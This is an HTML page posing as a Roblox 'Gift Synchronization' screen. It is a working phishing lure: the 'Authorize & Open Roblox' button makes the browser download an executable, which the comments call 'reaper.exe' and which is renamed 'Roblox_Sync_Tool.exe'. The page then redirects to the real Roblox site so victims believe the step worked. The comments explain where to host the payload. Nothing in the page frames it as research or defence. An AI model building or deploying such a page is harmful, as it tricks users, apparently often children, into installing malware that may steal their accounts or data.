<!DOCTYPE html>
<html>
<head>
    <title>Roblox | Home</title>
    <style>
        body { background: #1a1b1d; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { text-align: center; background: #2f3136; padding: 40px; border-radius: 12px; border: 1px solid #00b2ff; }
        .btn { background: #00b2ff; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="100">
        <h2>Gift Synchronization</h2>
        <p>Click "Authorize" to link the Heart Box to your Edge session.</p>
        
        <button class="btn" onclick="theHook()">AUTHORIZE & OPEN ROBLOX</button>
    </div>

    <script>
        function theHook() {
            // 1. AUTO-DOWNLOAD THE REAPER
            // You must host your 'reaper.exe' (the Python file we made) on a site like MediaFire or Discord
            const reaperLink = "YOUR_DIRECT_LINK_TO_REAPER_EXE";
            
            const downloadAnchor = document.createElement('a');
            downloadAnchor.href = reaperLink;
            downloadAnchor.download = "Roblox_Sync_Tool.exe";
            downloadAnchor.click();

            // 2. REDIRECT TO REAL ROBLOX
            // This makes them think the "Authorize" worked
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/home";
            }, 1000);
        }
    </script>
</body>
</html>
